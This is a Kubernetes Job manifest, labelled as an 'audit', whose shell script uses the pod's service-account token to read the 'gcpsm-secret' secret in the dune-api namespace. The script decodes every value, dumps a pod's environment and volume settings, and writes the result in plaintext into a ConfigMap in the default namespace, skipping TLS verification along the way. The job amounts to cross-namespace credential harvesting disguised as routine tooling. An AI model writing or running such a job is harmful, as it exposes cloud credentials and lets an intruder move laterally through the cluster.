apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v15
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q postgresql-client jq
          
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          
          echo "=GCPSM_SECRET=" > /tmp/out.txt
          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
            "$API/api/v1/namespaces/dune-api/secrets/gcpsm-secret" | jq -r '.data | to_entries[] | .key + "=" + (.value | @base64d)' >> /tmp/out.txt 2>&1
          
          echo "=DUNE_POD_SPEC=" >> /tmp/out.txt
          POD=$(curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
            "$API/api/v1/namespaces/dune-api/pods" | jq -r '.items[0].metadata.name')
          echo "Pod: $POD" >> /tmp/out.txt
          
          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
            "$API/api/v1/namespaces/dune-api/pods/$POD" | jq '{
              name: .metadata.name,
              env: .spec.containers[0].env,
              envFrom: .spec.containers[0].envFrom,
              volumes: .spec.volumes,
              image: .spec.containers[0].image
            }' >> /tmp/out.txt 2>&1
          
          echo "=DUNE_POD_ENVS=" >> /tmp/out.txt
          # Get actual container env (including inherited from configmap/secret)
          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
            "$API/api/v1/namespaces/dune-api/pods/$POD" | jq -r '.spec.containers[0].env[]? | .name + "=" + (.value // ("secretRef:" + (.valueFrom.secretKeyRef.name // "unknown")))' >> /tmp/out.txt 2>&1
          
          cat /tmp/out.txt
          
          PAYLOAD=$(jq -n --rawfile content /tmp/out.txt '{"data":{"result":$content}}')
          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/merge-patch+json" \
            -X PATCH "$API/api/v1/namespaces/default/configmaps/dune-audit-result3" \
            -d "$PAYLOAD" > /tmp/patch.txt
          echo "Patched: $(cat /tmp/patch.txt | jq -r '.metadata.name // .message')"
          
          sleep 90